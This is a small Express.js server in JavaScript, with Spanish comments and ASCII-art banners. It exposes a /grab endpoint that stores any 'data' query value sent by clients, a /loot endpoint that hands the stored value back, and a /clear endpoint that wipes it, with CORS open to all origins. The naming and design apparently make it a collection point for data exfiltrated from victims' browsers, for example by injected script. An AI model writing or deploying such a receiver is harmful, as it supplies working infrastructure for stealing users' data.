/*
░█▀▄░█▀▀░█▀█░█▀▀░█▀█░█▀▄░█▀▀░█▀█░█▀▀░▀█▀░█▀█░█▀▀
░█░█░█▀▀░█▀▀░█▀▀░█░█░█░█░█▀▀░█░█░█░░░░█░░█▀█░▀▀█
░▀▀░░▀▀▀░▀░░░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀
*/

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const app = express();
const port = 3000;
let texto = "";

/*
░█▀▀░█▀█░█▀█░█▀▀░▀█▀░█▀▀
░█░░░█░█░█░█░█▀▀░░█░░█░█
░▀▀▀░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀
*/

app.use(cors());
app.use(cors({
    origin: 'https://ultraeffective.neocities.org',
    optionsSuccessStatus: 200
}));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
app.use((req, res, next) => {
    console.log(`${req.method} ${req.url}`);
    next();
});

/*
░█▀▀░█▀█░█▀▄░█▀█░█▀█░▀█▀░█▀█░▀█▀░█▀▀
░█▀▀░█░█░█░█░█▀▀░█░█░░█░░█░█░░█░░▀▀█
░▀▀▀░▀░▀░▀▀░░▀░░░▀▀▀░▀▀▀░▀░▀░░▀░░▀▀▀
*/

app.get('/grab', (req, res) => { // captura los datos enviados por el cliente
    const data = req.query.data;
    if(data){
        texto = data;
        res.send('Datos guardados correctamente.');
    } else {
        res.status(400).send('No se proporcionó ningún dato.');
    }
});

app.get('/loot', (req, res) => { // envía los datos guardados al cliente
    res.send(texto);
});

app.get('/clear', (req, res) => { // limpia el archivo de salida
    texto = "";
    res.send('Archivo limpiado correctamente.');
});

/*
░█▀▄░█░█░█▀█
░█▀▄░█░█░█░█
░▀░▀░▀▀▀░▀░▀
*/

app.listen(port, () => {
    console.log(`Servidor escuchando en http://localhost:${port}`);
});
